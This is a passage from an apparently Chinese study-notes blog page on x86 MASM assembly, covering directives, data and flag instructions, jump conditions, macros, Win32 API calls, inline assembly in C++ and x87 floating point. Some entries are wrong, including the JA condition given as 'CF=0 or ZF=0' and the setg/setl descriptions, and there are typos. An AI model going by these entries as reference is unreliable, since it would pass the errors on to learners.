class="line">;EQU用于数值等价时不能重复定义符号名，但是&#x27;=&#x27;可以</span><br><span class="line">符号名 EQU 数值表达式</span><br><span class="line">符号名 EQU &lt;字符串&gt;</span><br><span class="line">符号名 = 数值表达式</span><br></pre></td></tr></table></figure><h4 id="2-2-变量定义"><a href="#2-2-变量定义" class="headerlink" title="2.2 变量定义"></a>2.2 变量定义</h4><blockquote><p>定义</p><ul><li>变量 变量定义伪指令 处置表</li><li>变量定义伪指令 重复次数 dup(重复参数)</li></ul><p>除了如下定义汇编还支持：Structure（结构），Record（记录），Union（联合）</p></blockquote><div class="table-container"><table><thead><tr><th>老版</th><th>新版</th><th>作用</th></tr></thead><tbody><tr><td>db</td><td>byte</td><td>1B</td></tr><tr><td>dw</td><td>word</td><td>2B</td></tr><tr><td>dd</td><td>dword</td><td>4B</td></tr><tr><td>df</td><td>fword</td><td>6B，多用于16b段选择器和32b偏移地址的48b指针地址</td></tr><tr><td>dq</td><td>qword</td><td>8B</td></tr><tr><td>dt</td><td>tbyte</td><td>10B，多用于BCD码，浮点运算</td></tr></tbody></table></div><h4 id="2-3-变量指令"><a href="#2-3-变量指令" class="headerlink" title="2.3 变量指令"></a>2.3 变量指令</h4><div class="table-container"><table><thead><tr><th>属性</th><th>操作符</th><th>作用</th></tr></thead><tbody><tr><td><strong>地址</strong></td><td>[]</td><td>将括起的表达式作为存储器地址指针</td></tr><tr><td></td><td>$</td><td>返回当前偏移地址</td></tr><tr><td></td><td>offset 变量名</td><td>返回变量名所在段的偏移地址</td></tr><tr><td></td><td>seg 变量名</td><td>返回段基地址（实地址存储模型）</td></tr><tr><td><strong>类型</strong></td><td>类型名 ptr 变量名</td><td>将变量名按照指定的类型使用</td></tr><tr><td></td><td>type 变量名</td><td>返回一个字量数值，表明变量名的类型</td></tr><tr><td></td><td>lengthof 变量名</td><td>返回整个变量的数据项数（即元素数）</td></tr><tr><td></td><td>sizeof 变量名</td><td>返回整个变量占用的字节数</td></tr></tbody></table></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;伪指令，将参数表达的偏移地址作为当前偏移地址</span><br><span class="line">org para</span><br><span class="line"></span><br><span class="line">;伪指令，对齐，N是对齐数（2的平方）</span><br><span class="line">align N</span><br><span class="line">;伪指令，偶对齐（相当于align 2）</span><br><span class="line">even</span><br></pre></td></tr></table></figure><h3 id="3-通用数据处理指令"><a href="#3-通用数据处理指令" class="headerlink" title="3 通用数据处理指令"></a>3 通用数据处理指令</h3><h4 id="3-1-数据操作指令"><a href="#3-1-数据操作指令" class="headerlink" title="3.1 数据操作指令"></a>3.1 数据操作指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;数据交换</span><br><span class="line">xchg si,di</span><br><span class="line"></span><br><span class="line">;获得偏移地址（offset在编译阶段就获得了，但是lea可以动态获得）</span><br><span class="line">lea esi,label</span><br><span class="line"></span><br><span class="line">;换码指令([AL]=[EBX+AL])，用于字典</span><br><span class="line">xlat</span><br><span class="line"></span><br><span class="line">;求补指令([rem]=0-[rem])</span><br><span class="line">neg rem</span><br><span class="line"></span><br><span class="line">;有符号乘法</span><br><span class="line">imul reg/mem</span><br><span class="line">;双/三操作数乘法</span><br><span class="line">imul reg,reg/mem/imm</span><br><span class="line">imul reg,reg/mem,imm</span><br><span class="line"></span><br><span class="line">;有符号除法</span><br><span class="line">idiv reg/mem</span><br><span class="line"></span><br><span class="line">;零扩展位（后者一定小于前者，前面补0）</span><br><span class="line">movzx r16,r8</span><br><span class="line">movzx r32,r16</span><br><span class="line">;符号扩展位（带符号扩展，负数前面补全1，整数补全0）</span><br><span class="line">movsx r16,r8</span><br><span class="line">movsx r32,r16</span><br><span class="line">;扩展指令集（i8086只有CBW和CWD，其他包括movzx都没有）</span><br><span class="line">CBW     ;al符号扩展ax</span><br><span class="line">CWD     ;ax符号扩展dx和ax</span><br><span class="line">CWDE    ;ax符号扩展eax</span><br><span class="line">CDQ     ;eax符号扩展edx和eax</span><br><span class="line"></span><br><span class="line">;非</span><br><span class="line">not reg/mem</span><br><span class="line">;异或</span><br><span class="line">xor reg,mem</span><br><span class="line">;测试，逻辑与（只改变状态标志）</span><br><span class="line">test reg,mem</span><br><span class="line"></span><br><span class="line">;算术移位（负数右移时前面补1）</span><br><span class="line">sal reg</span><br><span class="line">sar reg</span><br><span class="line"></span><br><span class="line">;循环移位</span><br><span class="line">rol reg,cl;不带进位左移</span><br><span class="line">ror reg,cl;不带进位右移</span><br><span class="line">rcl reg,cl;带进位左移</span><br><span class="line">rcr reg,cl;带进位右移</span><br></pre></td></tr></table></figure><h4 id="3-2-标志位操作"><a href="#3-2-标志位操作" class="headerlink" title="3.2 标志位操作"></a>3.2 标志位操作</h4><div class="table-container"><table><thead><tr><th>指令</th><th>功能</th><th>指令</th><th>功能</th></tr></thead><tbody><tr><td>clc</td><td>复位进位标志：CF=0</td><td>lahf</td><td>标志寄存器低字节内容传送到AH中</td></tr><tr><td>stc</td><td>置位进位标志：CF=1</td><td>sahf</td><td>AH内容传送到标志寄存器最低位</td></tr><tr><td>cmc</td><td>求反进位标志：0变1,1变0</td><td>pushf</td><td>标志寄存器地16位入栈</td></tr><tr><td>cld</td><td>复位方向标志：DF=0，串操作后地址增大</td><td>popf</td><td>堆栈顶部一个字量数据弹出到标志寄存器低16位</td></tr><tr><td>std</td><td>复位方向标志：DF=1，串操作后地址减小</td><td>pushfd</td><td>32位标志寄存器内容全部压入堆栈</td></tr><tr><td>cli</td><td>复位中断标志：IF=0，禁止可屏蔽中断</td><td>popfd</td><td>当前堆栈顶部一个双字数据弹出到标志寄存器</td></tr><tr><td>sti</td><td>置位中断标志：IF=1，允许可屏蔽中断</td><td></td></tr></tbody></table></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;取ZF标志位值存入寄存器中（用于 == ）</span><br><span class="line">sete mem</span><br><span class="line">setz mem</span><br><span class="line">;取ZF标志位值再取反存入寄存器中（用于 != ）</span><br><span class="line">setne mem</span><br><span class="line">setnz mem</span><br><span class="line"></span><br><span class="line">;当ZF == 0 &amp;&amp; SF == 0 &amp;&amp; OF == 1时 mem = 1（用于 &gt; ）</span><br><span class="line">setg mem</span><br><span class="line">;当sf == 1 || OF == 1时 mem = 1（用于 &lt; ）</span><br><span class="line">setl mem</span><br><span class="line">;当SF == 0F时 mem = 1（用于 &gt;= ）</span><br><span class="line">setge mem</span><br><span class="line">;当ZF == 1 || SF != OF时 mem = 1（用于 &lt;= ）</span><br><span class="line">setle mem</span><br></pre></td></tr></table></figure><h3 id="4-程序结构"><a href="#4-程序结构" class="headerlink" title="4 程序结构"></a>4 程序结构</h3><h4 id="4-1-跳转"><a href="#4-1-跳转" class="headerlink" title="4.1 跳转"></a>4.1 跳转</h4><div class="table-container"><table><thead><tr><th>助记符</th><th>标志位</th><th>英文含义</th><th>中文说明</th></tr></thead><tbody><tr><td>JZ / JE</td><td>ZF=1</td><td>Jump if Zero / Equal</td><td>等于零/相等</td></tr><tr><td>JNZ / JNE</td><td>ZF=0</td><td>Jump if Not Zero / Not Equal</td><td>不等于零/不相等</td></tr><tr><td>JS</td><td>SF=1</td><td>Jump if Sign</td><td>符号为负</td></tr><tr><td>JNS</td><td>SF=0</td><td>Jump if Not Sign</td><td>符号为正</td></tr><tr><td>JP / JPE</td><td>PF=1</td><td>Jump if Parity / Parity Even</td><td>1的个数为偶</td></tr><tr><td>JNP / JPO</td><td>PF=0</td><td>Jump if Not Parity / Parity Odd</td><td>1的个数为奇</td></tr><tr><td>JO</td><td>OF=1</td><td>Jump if Overflow</td><td>溢出</td></tr><tr><td>JNO</td><td>OF=0</td><td>Jump if Not Overflow</td><td>无溢出</td></tr><tr><td>JC / JB / JNAE</td><td>CF=1</td><td>Jump if Carry / Below / Not Above or Equal</td><td>进位/低于/不高于等于</td></tr><tr><td>JNC / JNB / JAE</td><td>CF=0</td><td>Jump if Not Carry / Not  Below / Above or Equal</td><td>无进位/不低于/高于等于</td></tr><tr><td>JBE / JNA</td><td>CF=1 or ZF=1</td><td>Jump if Below or Equal /  Not Above</td><td>低于等于/不高于</td></tr><tr><td>JNBE / JA</td><td>CF=0 or ZF=0</td><td>Jump if Not Below or Equal / Above</td><td>不低于等于/高于</td></tr><tr><td>JL / JNGE</td><td>SF != OF</td><td>Jump if Less / Not Greater or Equal</td><td>小于/不大于等于</td></tr><tr><td>JNL / JGE</td><td>SF=OF</td><td>Jump if Not Less / Greater or Equal</td><td>不小于/大于等于</td></tr><tr><td>JLE / JNG</td><td>SF != OF or ZF=1</td><td>Jump if Less or Equal / Not Greater</td><td>小于等于/不大于</td></tr><tr><td>JNLE / JG</td><td>SF=OF and ZF=0</td><td>Jump if Not Less or Equal / Greater</td><td>不小于等于/大于</td></tr></tbody></table></div><h4 id="4-2-分支循环"><a href="#4-2-分支循环" class="headerlink" title="4.2 分支循环"></a>4.2 分支循环</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;ecx=0跳转，否则向下</span><br><span class="line">jcxz/jecxz label</span><br></pre></td></tr></table></figure><h4 id="4-3-结构体"><a href="#4-3-结构体" class="headerlink" title="4.3 结构体"></a>4.3 结构体</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;定义结构体</span><br><span class="line">Snake struct</span><br><span class="line">lendword?</span><br><span class="line">xdword?</span><br><span class="line">ydword?</span><br><span class="line">Snake ends</span><br><span class="line">;初始化</span><br><span class="line">sn1 Snake &lt;5,2,3&gt;</span><br><span class="line">;预留空间</span><br><span class="line">Snake 100 dup(&lt;&gt;)</span><br><span class="line">;字段引用</span><br><span class="line">mov sn1.len,100</span><br><span class="line">;匿名寻址</span><br><span class="line">mov [ebx].Snake.x,eax</span><br></pre></td></tr></table></figure><h3 id="5-模块化编程"><a href="#5-模块化编程" class="headerlink" title="5 模块化编程"></a>5 模块化编程</h3><h4 id="5-1-源程序框架"><a href="#5-1-源程序框架" class="headerlink" title="5.1 源程序框架"></a>5.1 源程序框架</h4><blockquote><p><a href="https://blog.csdn.net/bcbobo21cn/article/details/108571303">Win32汇编基本编程框架</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 源程序框架</span><br><span class="line">.686;编译模式</span><br><span class="line">.model flat,stdcall;默认模式</span><br><span class="line">option casemap:none;编译器大小写不敏感</span><br><span class="line"></span><br><span class="line">include io32.inc;头文件</span><br><span class="line"></span><br><span class="line">.stack [堆栈段大小]</span><br><span class="line">.data</span><br><span class="line">msg dword 1;初始化变量</span><br><span class="line">.data?</span><br><span class="line">msg dword ? ;未初始化变量</span><br><span class="line">.const</span><br><span class="line">...;常量定义</span><br><span class="line">.code</span><br><span class="line">... ;普通代码</span><br><span class="line">start:</span><br><span class="line">    ... ;执行代码</span><br><span class="line">    [exit 0] ;退出代码</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><h4 id="5-2-函数传参"><a href="#5-2-函数传参" class="headerlink" title="5.2 函数传参"></a>5.2 函数传参</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ret      ;无参返回：出栈返回地址</span><br><span class="line">ret i16  ;带参返回：出栈返回地址，ESP=ESP+i16</span><br><span class="line"></span><br><span class="line">;传参方式</span><br><span class="line">;1.寄存器传参，返回可用寄存器返回（一般是EAX）</span><br><span class="line">;2.堆栈传参，返回一般不用堆栈</span><br><span class="line">;3.内存传参（指针）</span><br><span class="line">;4.多参数传参：将参数地址存入堆栈，依次取得堆栈数据</span><br></pre></td></tr></table></figure><h4 id="5-3-头文件"><a href="#5-3-头文件" class="headerlink" title="5.3 头文件"></a>5.3 头文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;引用头文件</span><br><span class="line">include *.inc</span><br><span class="line">;引用库文件</span><br><span class="line">includelib *.lib</span><br><span class="line"></span><br><span class="line">public 标识符[,标识符...]            ;可被外部程序使用</span><br><span class="line">extern 标识符:类型[,标识符:类型...]    ;数据来自外部程序</span><br><span class="line">;案例</span><br><span class="line">;主程序</span><br><span class="line">public write</span><br><span class="line">extern temp:dword</span><br><span class="line">;子程序</span><br><span class="line">extern rdhd:near</span><br><span class="line">public temp</span><br></pre></td></tr></table></figure><h4 id="5-4-宏定义"><a href="#5-4-宏定义" class="headerlink" title="5.4 宏定义"></a>5.4 宏定义</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;;宏</span><br><span class="line">;定义宏</span><br><span class="line">宏名 macro[形参表]</span><br><span class="line">...</span><br><span class="line">endm</span><br><span class="line">;使用宏</span><br><span class="line">宏名[实参表]</span><br><span class="line">;在汇编时，宏指令被汇编程序用宏定义的代码序列替代。</span><br><span class="line"></span><br><span class="line">;宏的局部标号伪指令（必须是marcro语句后的第一条语句，两者间不能有分号或注释）</span><br><span class="line">local 标号列表</span><br><span class="line"></span><br><span class="line">;删除宏名表（逗号隔开宏名）</span><br><span class="line">purge 宏名表</span><br><span class="line">;立刻停止后面部分的宏展开</span><br><span class="line">extim</span><br><span class="line"></span><br><span class="line">;;重复汇编</span><br><span class="line">;参数值重复</span><br><span class="line">repeat 重复次数</span><br><span class="line">...</span><br><span class="line">endm</span><br><span class="line"></span><br><span class="line">;参数个数重复</span><br><span class="line">for 形参,&lt;实参表&gt;</span><br><span class="line">...</span><br><span class="line">endm</span><br><span class="line">;案例</span><br><span class="line">for regard,&lt;eax,ebx,ecx,edx&gt;</span><br><span class="line">push regad</span><br><span class="line">endm</span><br><span class="line">;=&gt; </span><br><span class="line">push eax</span><br><span class="line">push ebx</span><br><span class="line">push ecx</span><br><span class="line">push edx</span><br><span class="line"></span><br><span class="line">;按字符个数</span><br><span class="line">forc 形参,字符串</span><br><span class="line">...</span><br><span class="line">endm</span><br><span class="line">;案例（结果同理上，pop edx...）</span><br><span class="line">forc regad,dcba</span><br><span class="line">pop e&amp;regad&amp;x</span><br><span class="line">endm</span><br><span class="line"></span><br><span class="line">;条件汇编（按条件汇编指定语句）</span><br><span class="line">ifxx 表达式</span><br><span class="line">分支语句体1</span><br><span class="line">[else</span><br><span class="line">分支语句体2]</span><br><span class="line">endif</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>宏操作符</th><th>作用</th></tr></thead><tbody><tr><td>&amp;</td><td>替换操作符，用于将参数与其他字符分开。如果参数紧接在其他字符之前或之后，或者参数出现在带引号的字符串中，就必须使用该伪操作符</td></tr><tr><td>&lt;&gt;</td><td>字符串传递操作符，用于括起字符串。在宏调用中，如果传递的字符串实参数含有逗号、空格等间隔符号、则必须用这对操作符，以保证字符串的完整</td></tr><tr><td>!</td><td>转义操作符，用于指示其后的一个字符作为一般字符，而不含特殊意义</td></tr><tr><td>%</td><td>表达式操作符，用在宏调用中，表示将后跟的一个表达式的值作为实参，而不是将表达式本身作为参数</td></tr><tr><td>;;</td><td>宏注释符，用于表示在宏定义中的注释。采用这个符号的注释，在宏展开时不出现</td></tr><tr><td>: reg</td><td>说明宏定义设定的参数在调用时不可缺少</td></tr><tr><td>: =默认值</td><td>设定参数默认值</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>格式</th><th>功能说明</th></tr></thead><tbody><tr><td>if 表达式</td><td>汇编程序求出表达式的值，不为0满足条件</td></tr><tr><td>ife 表达式</td><td>汇编程序求出表达式的值，为0满足条件</td></tr><tr><td>ifdef 符号</td><td>符号已定义（内部定义或声明外部定义），则满足条件</td></tr><tr><td>ifndef 符号</td><td>符号未定义，则满足条件</td></tr><tr><td>ifb &lt;形参&gt;</td><td>用在宏定义体内。如果宏调用没有用实参替代该形参，则满足条件</td></tr><tr><td>ifnb &lt;形参&gt;</td><td>用在宏定义体内。如果宏调用用实参替代该形参，则满足条件</td></tr><tr><td>ifidn &lt;字符串1&gt;，&lt;字符串2&gt;</td><td>字符串1与字符串2相同则条件满足；区分大小写</td></tr><tr><td>ifdif &lt;字符串1&gt;，&lt;字符串2&gt;</td><td>字符串1与字符串2不相同则条件满足；区分大小写</td></tr><tr><td>ifidni &lt;字符串1&gt;，&lt;字符串2&gt;</td><td>字符串1与字符串2相同则条件满足；不区分大小写</td></tr><tr><td>ifdifi &lt;字符串1&gt;，&lt;字符串2&gt;</td><td>字符串1与字符串2不相同则条件满足；不区分大小写</td></tr></tbody></table></div><h4 id="5-5-简单案例"><a href="#5-5-简单案例" class="headerlink" title="5.5 简单案例"></a>5.5 简单案例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;弹窗显示hello world</span><br><span class="line">.386</span><br><span class="line">.model flat, stdcall</span><br><span class="line">option casemap:none</span><br><span class="line"></span><br><span class="line">include \masm32\include\windows.inc</span><br><span class="line">include \masm32\include\kernel32.inc</span><br><span class="line">include \masm32\include\user32.inc</span><br><span class="line"></span><br><span class="line">includelib \masm32\lib\kernel32.lib</span><br><span class="line">includelib \masm32\lib\user32.lib</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">msg db &#x27;Hello, world!&#x27;,0</span><br><span class="line"></span><br><span class="line">.code</span><br><span class="line">start:</span><br><span class="line">    invoke  MessageBox,NULL,offset msg,offset msg,MB_OK ;用于弹窗</span><br><span class="line">    invoke  ExitProcess,0 ;用于弹窗</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><hr><h2 id="二、Windows编程"><a href="#二、Windows编程" class="headerlink" title="二、Windows编程"></a>二、Windows编程</h2><h3 id="1-库调用"><a href="#1-库调用" class="headerlink" title="1 库调用"></a>1 库调用</h3><ul><li><p>连接</p><ul><li><p>静态连接（.lib）</p><blockquote><p>连接程序会自动从库文件中抽取需要的子程序插入到可执行代码中</p></blockquote></li><li><p>动态连接（.dll）</p><blockquote><p>每次需要执行指定代码时才会去动态连接库中找到对应的代码执行。</p></blockquote></li></ul></li><li><p>库</p><ul><li><p>kernel32.dll</p><blockquote><p>系统服务函数，主要处理内存管理和进度调度。</p></blockquote></li><li><p>user32.dll</p><blockquote><p>用户接口函数，主要控制用户界面。</p></blockquote></li><li><p>gdi32.dll</p><blockquote><p>图形设备函数，主要负责图形方面的操作。</p></blockquote></li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;过程声明</span><br><span class="line">;过程名：proc定义的过程名、API函数名、高级语言函数名</span><br><span class="line">;调用距离：near，far。省略由存储模型自己决定</span><br><span class="line">;语言类型：STDCALL（系统API调用规范）、C（C语言调用规范）等。如果该过程使用的语言类型与存储模型model伪指令定义的相同，这里可以省略，否则必须说明</span><br><span class="line">过程名 proto [调用距离][语言类型][[,参数]:类型]...</span><br><span class="line"></span><br><span class="line">;过程调用</span><br><span class="line">invoke 过程名[,参数,...]</span><br><span class="line"></span><br><span class="line">;案例：程序退出函数</span><br><span class="line">;kernel32.dll中，用于结束一个进程及其所有线程</span><br><span class="line">void ExitProcess(UINT uExitCode);</span><br><span class="line">;汇编中定义</span><br><span class="line">ExitProcess proto,:dword</span><br><span class="line">;汇编中使用</span><br><span class="line">invoke ExitProcess,0</span><br><span class="line">;将退出做成宏（该宏存在于io32.inc中）</span><br><span class="line">exit marco dwexitcode</span><br><span class="line">invoke ExitProcess,dwexitcode</span><br><span class="line">endm</span><br><span class="line">;使用</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure><h3 id="2-控制台程序"><a href="#2-控制台程序" class="headerlink" title="2 控制台程序"></a>2 控制台程序</h3><blockquote><p>句柄：32位无符号整数，用来唯一确定一个对象，如输入设备、输出设备或一个文件、图形等。</p><p>API 函数返回值保存在 EAX 中。</p><p>输出函数：</p><ul><li><p>Windows 95/98 操作系统不支持以W结尾的函数。</p></li><li><p>Windows NT/2000/XP 操作系统的内置字符集是 Unicode，在这些操作系统中如果调用以A结尾的函数，操作系统会首先将ANSI字符转换成Unicode字符，然后再调用以W结尾的对应函数。</p></li><li><p>在微软MSDN文档中，函数名尾部的字母 A 或 W 被省略，汇编语言使用时需要重新声明。</p></li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;控制台函数都存在kernel32.dll中，所以要导入kernel32.lib</span><br><span class="line">includelib kernel32.lib</span><br><span class="line"></span><br><span class="line">STD_INPUT_HANDLE = -10 ;标准输入句柄，值为-10</span><br><span class="line">STD_OUTPUT_HANDLE = -11 ;标准输出句柄，值为-11</span><br><span class="line">STD_ERROR_HANDLE = -12 ;标准错误句柄，值为-12</span><br><span class="line"></span><br><span class="line">;获得句柄函数</span><br><span class="line">HANDLE GetStdHandle(dword nStdHandle);</span><br><span class="line">;汇编使用</span><br><span class="line">GetStdHandle proto,nStdHandle:dword</span><br><span class="line">invoke GetStdHandle,STD_OUTPUT_HANDLE</span><br><span class="line"></span><br><span class="line">;输出函数声明(ASCII:WriteConsoleA,Unicode:WriteConsoleW)</span><br><span class="line">WriteConsole equ&lt;WriteConsoleA&gt;;重新声明</span><br><span class="line">;输出函数</span><br><span class="line">Bool WriteConsole(</span><br><span class="line">HANDLE HConsoleOutput,</span><br><span class="line">CONST VOID *lpBuffer,</span><br><span class="line">DWORD nNumberOfCharsToWrite,</span><br><span class="line">LPDWORD lpNumberOfCharsWritten,</span><br><span class="line">LPVOID lpReserved</span><br><span class="line">)</span><br><span class="line">;汇编使用</span><br><span class="line">WriteConsoleA proto,</span><br><span class="line">handle:dword,    ;输出句柄</span><br><span class="line">pbuffer:dword,   ;输出缓冲区指针</span><br><span class="line">bufsize:dword,   ;输出缓冲区大小</span><br><span class="line">pcount:dword,    ;实际输出字符数量的指针</span><br><span class="line">lpreserved:dword ;保留（必须为0）</span><br><span class="line">invoke GetStdHandle,STD_OUTPUT_HANDLE</span><br><span class="line">invoke WriteConsole,eax,addr msg,sizeof msg,addr outsize(.data中dword ?),0</span><br><span class="line"></span><br><span class="line">;输入函数</span><br><span class="line">BOOL ReadConsole(</span><br><span class="line">HANDLE hConsoleInput,</span><br><span class="line">LPVOID lpBuffer</span><br><span class="line">DOWRD nNumberOfCharsToRead,</span><br><span class="line">LPDWORD lpNumberOfCharsRead,</span><br><span class="line">LPVOID lpReversed</span><br><span class="line">)</span><br><span class="line">;汇编使用</span><br><span class="line">ReadConsoleA proto,</span><br><span class="line">handle:dword,     ;输入句柄</span><br><span class="line">pbuffer:dword,    ;输入缓冲区指针</span><br><span class="line">maxsize:dword,    ;要读取字符的最大数量</span><br><span class="line">pBytesRead:dword, ;实际读取字符数量的指针</span><br><span class="line">notUsed:dword     ;保留（必须为0）</span><br><span class="line">ReadConsole equ&lt;ReadConsoleA&gt;</span><br><span class="line">invoke GetStdHandle,STD_INPUT_HANDLE</span><br><span class="line">invoke ReadConsole,eax,addr _inbuffer(.data中byte 255 dup(0)),255,addr _insize(.data中dword ?),0</span><br><span class="line"></span><br><span class="line">;获得控制台模式</span><br><span class="line">GetConsoleMode proto,hConsoleHandle:dword,lpMode:dword</span><br><span class="line">;设置控制台模式(dwMode=0:单字符模式（可以读退格回车tab等，不能读ESC，F1-F12,ctrl,alt,shift,home,end等）)</span><br><span class="line">SetConsoleMode proto,hConsoleHandle:dword,dwMode:dword</span><br></pre></td></tr></table></figure><h3 id="3-图形化界面"><a href="#3-图形化界面" class="headerlink" title="3 图形化界面"></a>3 图形化界面</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;消息窗口。（在USER32.dll中）创建失败返回0</span><br><span class="line">int MessageBox(</span><br><span class="line">HWND hWnd,;父窗口（0表示没有）</span><br><span class="line">LPCTSTR lpText,;内容字符串首地址（0结尾）</span><br><span class="line">LPCTSTR lpCaption,;标题字符串首地址（0结尾）</span><br><span class="line">UINT uType;窗口选项：MB_OK(0):OK,MB_OKCANCEL(1):OK&amp;&amp;Cancel</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">;获取时间函数</span><br><span class="line">void GetLocalTime(LPSYSTEMTIME lpSystemTime);</span><br><span class="line">;汇编语言</span><br><span class="line">GetLocalTime proto,:dword</span><br><span class="line">SYSTEMTIME struct(年月星期日时分秒毫秒，word型)</span><br><span class="line">mytime SYSTEMTIME &lt;&gt;</span><br><span class="line">invoke GetLocalTime,addr mytime</span><br><span class="line"></span><br><span class="line">;图形化界面</span><br></pre></td></tr></table></figure><h3 id="4-高级语言特性"><a href="#4-高级语言特性" class="headerlink" title="4 高级语言特性"></a>4 高级语言特性</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;定义子程序</span><br><span class="line">label_name proc [调用距离][语言类型][作用范围][&lt;起始参数&gt;][USES寄存器列表][形参:类型,...]</span><br><span class="line">local 参数表</span><br><span class="line">...;</span><br><span class="line">label_name endp</span><br><span class="line">;语言类型：SRDCALL,C等</span><br><span class="line">;作用范围：public,private,export(隐含了public和far)</span><br><span class="line"></span><br><span class="line">;伪指令条件if</span><br><span class="line">.IF expr</span><br><span class="line">statement</span><br><span class="line">[.ELSEIF expr</span><br><span class="line">statement ]</span><br><span class="line">[.ELSE</span><br><span class="line">statement ]</span><br><span class="line">.ENDIF</span><br><span class="line"></span><br><span class="line">;伪指令while</span><br><span class="line">.WHILE expr</span><br><span class="line">...</span><br><span class="line">.ENDW</span><br><span class="line"></span><br><span class="line">;伪指令重复</span><br><span class="line">.REPEAT</span><br><span class="line">...</span><br><span class="line">.UNTIL expr</span><br><span class="line">;另一种形式</span><br><span class="line">.REPEAT</span><br><span class="line">...</span><br><span class="line">.UNTILCXZ [expr] ;ECX-=1,直到ECX=0或者条件为真</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>操作符（大于小于与或非同C语言）</th><th>功能</th></tr></thead><tbody><tr><td>&amp;</td><td>位测试</td></tr><tr><td>CARRY?</td><td>CF=1?</td></tr><tr><td>OVERFLOW?</td><td>OF=1?</td></tr><tr><td>PARITY?</td><td>PF=1?</td></tr><tr><td>SIGH?</td><td>SF=1?</td></tr><tr><td>ZERO?</td><td>ZF=1?</td></tr></tbody></table></div><hr><h2 id="三、与-C-混合编程"><a href="#三、与-C-混合编程" class="headerlink" title="三、与 C++ 混合编程"></a>三、与 C++ 混合编程</h2><h3 id="1-VS配置"><a href="#1-VS配置" class="headerlink" title="1 VS配置"></a>1 VS配置</h3><blockquote><ol><li>项目——生成依赖项——生成自定义——masm</li><li>Debug模式要是x86</li><li><a href="https://blog.csdn.net/luoyu510183/article/details/109429007">x64配置方式</a></li></ol></blockquote><h3 id="2-嵌入汇编"><a href="#2-嵌入汇编" class="headerlink" title="2 嵌入汇编"></a>2 嵌入汇编</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int a;</span><br><span class="line">    __asm ;多条嵌入</span><br><span class="line">    &#123;</span><br><span class="line">        lea eax,a</span><br><span class="line">        mov eax,15</span><br><span class="line">        mov a,eax</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">;单条嵌入多行</span><br><span class="line">__asm mov eax,01H</span><br><span class="line">__asm mov dx,0D007H</span><br><span class="line">__asm out dx,eax</span><br><span class="line">;单条嵌入单行（空格隔开）</span><br><span class="line">__asm mov eax,01H __asm mov dx,0D007H __asm out dx,eax</span><br></pre></td></tr></table></figure><hr><h2 id="四、DOS环境程序设计"><a href="#四、DOS环境程序设计" class="headerlink" title="四、DOS环境程序设计"></a>四、DOS环境程序设计</h2><blockquote><p><a href=".\a8fb0b6e">text::基础汇编</a></p></blockquote><h3 id="1-DOS编程"><a href="#1-DOS编程" class="headerlink" title="1 DOS编程"></a>1 DOS编程</h3><h3 id="2-串操作"><a href="#2-串操作" class="headerlink" title="2 串操作"></a>2 串操作</h3><h3 id="3-输入输出"><a href="#3-输入输出" class="headerlink" title="3 输入输出"></a>3 输入输出</h3><h3 id="4-中断"><a href="#4-中断" class="headerlink" title="4 中断"></a>4 中断</h3><hr><h2 id="五、扩展"><a href="#五、扩展" class="headerlink" title="五、扩展"></a>五、扩展</h2><h3 id="1-浮点指令"><a href="#1-浮点指令" class="headerlink" title="1 浮点指令"></a>1 浮点指令</h3><h4 id="1-1-浮点数"><a href="#1-1-浮点数" class="headerlink" title="1.1 浮点数"></a>1.1 浮点数</h4><ul><li><p>浮点数</p><blockquote><p>单精度：1位符号位，8位指数，23位有效数字。（D31-D0）</p><p>双精度：1位符号位，11位指数，52位有效数字。（D63-D0）</p></blockquote></li><li><p>浮点寄存器</p><blockquote><p>x87FPU浮点寄存器：80位数据寄存器，2位标记寄存器。分别是FPR0、tag0，FPR1、tag1…FPR7、tag7。</p><p>x87FPU的8个数据寄存器存取是栈原则且首尾循环。</p><p>在OD中显示的是st0-st7。</p><p>标记寄存器标记：</p><ul><li>00——对应数据寄存器存有有效数据。</li><li>01——对应数据寄存器数据为0。</li><li>10——对应数据寄存器数据是特殊数据，如NaN，无限大或非规格化数据。</li><li>11——对应数据寄存器内无数据。</li></ul></blockquote></li><li><p>浮点状态寄存器</p><blockquote></blockquote></li></ul><h4 id="1-2-浮点指令"><a href="#1-2-浮点指令" class="headerlink" title="1.2 浮点指令"></a>1.2 浮点指令</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;push [] -&gt; st</span><br><span class="line">fld []</span><br><span class="line">;st0 = (double)[],整数入栈</span><br><span class="line">fild []</span><br><span class="line"></span><br><span class="line">;pop st -&gt; []</span><br><span class="line">fst []</span><br><span class="line">;出栈并清空栈顶</span><br><span class="line">fstp []</span><br><span class="line">;浮点转有符号整数</span><br><span class="line">cvttsd2si r32,st0/m32</span><br><span class="line"></span><br><span class="line">;st0 += []</span><br><span class="line">fadd []</span><br><span class="line">;st0 -= []</span><br><span class="line">fsub []</span><br><span class="line">;st0 